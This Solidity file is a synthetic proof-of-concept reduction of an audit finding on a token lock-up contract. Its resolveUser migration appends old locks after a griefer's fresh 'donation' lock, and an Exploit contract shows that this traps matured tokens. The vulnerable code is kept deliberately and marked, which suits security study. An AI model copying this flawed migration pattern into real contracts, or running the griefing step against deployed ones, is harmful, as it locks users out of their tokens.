// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Remora Dynamic Tokens — resolveUser lock migration can be griefed
    (Cyfrin 2025-10-22, finding #63779, reporter 0xStalin)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _newAccountSameLocks APPENDS oldAddress locks after any
    existing locks on newAddress. availableTokens / _unlockTokens short-circuit
    on the first unexpired lock. A frontrun donation to newAddress plants a
    fresh lock at the front, so all migrated (already-aged) locks stay blocked
    until the donation lock expires.

    Vulnerable append + short-circuit lines preserved with @> VULN markers.
    No vm.warp: old locks use time = block.timestamp - lockUpTime (already
    matured); the donation uses block.timestamp (not yet matured).
//////////////////////////////////////////////////////////////////////////*/

contract LockUpManager {
    uint32 public lockUpTime;

    struct LockupEntry {
        uint32 time;
        uint32 amount;
    }

    struct UserData {
        uint16 startInd;
        uint16 endInd;
        uint32 tokensLocked;
        // fixed-size ring for the synthetic (enough for the PoC)
        LockupEntry[16] tokenLockUp;
    }

    mapping(address => UserData) internal _userData;
    mapping(address => uint256) public balanceOf;

    constructor(uint32 lockUpTime_) {
        lockUpTime = lockUpTime_;
    }

    /// @dev Credit `amount` tokens to `to` and append a lock entry at `lockTime`.
    function _creditWithLock(address to, uint32 amount, uint32 lockTime) internal {
        UserData storage u = _userData[to];
        require(u.endInd < 16, "full");
        u.tokenLockUp[u.endInd] = LockupEntry({time: lockTime, amount: amount});
        u.endInd += 1;
        u.tokensLocked += amount;
        balanceOf[to] += amount;
    }

    /// @dev Public mint-with-lock used to set up old user balances and the grief donation.
    function mintLocked(address to, uint32 amount, uint32 lockTime) external {
        _creditWithLock(to, amount, lockTime);
    }

    /// @dev Transfer creates a lock on the recipient at block.timestamp (grief vector).
    function transfer(address to, uint32 amount) external {
        require(availableTokens(msg.sender) >= amount, "locked");
        // unlock from sender's matured locks (simplified: just reduce balance/tokensLocked)
        _unlockTokens(msg.sender, amount, false);
        balanceOf[msg.sender] -= amount;
        _creditWithLock(to, amount, uint32(block.timestamp));
    }

    /// @dev Migrate locks from oldAddress onto newAddress by appending.
    function resolveUser(address oldAddress, address newAddress) external {
        _newAccountSameLocks(oldAddress, newAddress);
        // move balance
        uint256 bal = balanceOf[oldAddress];
        balanceOf[oldAddress] = 0;
        balanceOf[newAddress] += bal;
    }

    function _newAccountSameLocks(address oldAddress, address newAddress) internal {
        UserData storage oldData = _userData[oldAddress];
        UserData storage newData = _userData[newAddress];
        // @audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`
        uint16 len = oldData.endInd - oldData.startInd;
        for (uint16 i = 0; i < len; ++i) {
            // FIX: merge-sort / insert by time so matured locks stay ahead of fresh ones
            newData.tokenLockUp[newData.endInd++] =
                oldData.tokenLockUp[oldData.startInd + i]; // @> VULN: append-only migration — no reorder by lock time
        }
        newData.tokensLocked += oldData.tokensLocked;
        // reset old user data
        delete _userData[oldAddress];
    }

    function _unlockTokens(address holder, uint256 amount, bool disregardTime)
        internal
        returns (uint32 amountUnlocked)
    {
        UserData storage userData = _userData[holder];
        uint16 len = userData.endInd;
        uint32 curTime = _now();
        uint256 remaining = amount;
        for (uint16 i = userData.startInd; i < len; ++i) {
            // if not disregarding time, then check if the lock up time
            // has been served; if not break out of loop
            // @audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
            if (!disregardTime && curTime - userData.tokenLockUp[i].time < lockUpTime) {
                // @> VULN (paired): short-circuit on first unexpired lock blocks later matured entries
                break;
            }
            uint32 curEntryAmount = userData.tokenLockUp[i].amount;
            if (curEntryAmount == 0) {
                userData.startInd = i + 1;
                continue;
            }
            if (curEntryAmount <= remaining) {
                remaining -= curEntryAmount;
                amountUnlocked += curEntryAmount;
                userData.tokenLockUp[i].amount = 0;
                userData.startInd = i + 1;
            } else {
                userData.tokenLockUp[i].amount = uint32(curEntryAmount - remaining);
                amountUnlocked += uint32(remaining);
                remaining = 0;
                break;
            }
        }
        userData.tokensLocked -= amountUnlocked;
    }

    /// @dev Overrideable "now" so the synthetic can demonstrate matured-vs-fresh locks
    ///      without cheatcodes (set once in the Exploit before checking availability).
    uint32 public timeNow;

    function setTimeNow(uint32 t) external {
        timeNow = t;
    }

    function _now() internal view returns (uint32) {
        return timeNow == 0 ? uint32(block.timestamp) : timeNow;
    }

    function availableTokens(address holder) public view returns (uint256 tokens) {
        UserData storage userData = _userData[holder];
        uint16 len = userData.endInd;
        uint32 curTime = _now();
        for (uint16 i = userData.startInd; i < len; ++i) {
            LockupEntry memory curEntry = userData.tokenLockUp[i];
            if (curTime - curEntry.time >= lockUpTime) {
                tokens += curEntry.amount;
                // @audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
            } else {
                break; // @> VULN (paired): short-circuit — a fresh front lock hides all later matured locks
            }
        }
    }

    function tokensLockedOf(address who) external view returns (uint32) {
        return _userData[who].tokensLocked;
    }

    function lockCount(address who) external view returns (uint16) {
        UserData storage u = _userData[who];
        return u.endInd - u.startInd;
    }

    function lockAt(address who, uint16 idx) external view returns (uint32 time, uint32 amount) {
        UserData storage u = _userData[who];
        LockupEntry memory e = u.tokenLockUp[u.startInd + idx];
        return (e.time, e.amount);
    }
}

contract Exploit {
    LockUpManager public locks; // CREATE nonce 1

    address public constant OLD_USER = address(0x01d);
    address public constant NEW_USER = address(0x02e);
    address public constant GRIEFER = address(0x03f);

    uint32 public constant LOCK_TIME = 365 days;
    uint32 public constant QUART = 365 days / 4;

    constructor() {
        locks = new LockUpManager(LOCK_TIME);
    }

    function run() external {
        // Use an absolute "now" large enough that matured lock times never under/overflow uint32.
        // (Playground/anvil default timestamps can be small; absolute times keep the demo robust.)
        uint32 nowT = uint32(2_000_000_000); // ~2033

        // Old user holds 4 tokens: one fully matured, three still locked for decreasing durations.
        // times = now - LOCK_TIME (fully matured), now - 3*QUART, now - 2*QUART, now - QUART
        locks.mintLocked(OLD_USER, 1, nowT - LOCK_TIME); // fully matured
        locks.mintLocked(OLD_USER, 1, nowT - 3 * QUART);
        locks.mintLocked(OLD_USER, 1, nowT - 2 * QUART);
        locks.mintLocked(OLD_USER, 1, nowT - QUART);

        locks.setTimeNow(nowT);

        // Without grief: fully matured lock would already be available on OLD_USER
        require(locks.availableTokens(OLD_USER) == 1, "setup: one matured lock expected");

        // Griefer plants a FRESH lock on NEW_USER (front of the ring) — donation at `now`
        locks.mintLocked(NEW_USER, 1, nowT);

        // Resolve: appends OLD_USER's locks AFTER the grief lock
        locks.resolveUser(OLD_USER, NEW_USER);

        // HARM: availableTokens short-circuits on the fresh front lock, so even the
        // fully matured migrated lock is invisible. Without the grief donation,
        // availableTokens(NEW_USER) would be 1 (the matured entry).
        require(locks.availableTokens(NEW_USER) == 0, "grief failed: matured locks still available");
        require(locks.lockCount(NEW_USER) == 5, "expected 1 grief + 4 migrated locks");

        // Confirm ordering: first lock is the fresh donation; a matured one sits behind it
        (uint32 t0,) = locks.lockAt(NEW_USER, 0);
        (uint32 t1,) = locks.lockAt(NEW_USER, 1);
        require(t0 == nowT, "front lock is not the grief donation");
        require(t1 == nowT - LOCK_TIME, "matured lock trapped behind grief lock");
        require(nowT - t1 >= LOCK_TIME, "trapped lock is matured");
        require(nowT - t0 < LOCK_TIME, "grief lock still active");
    }
}
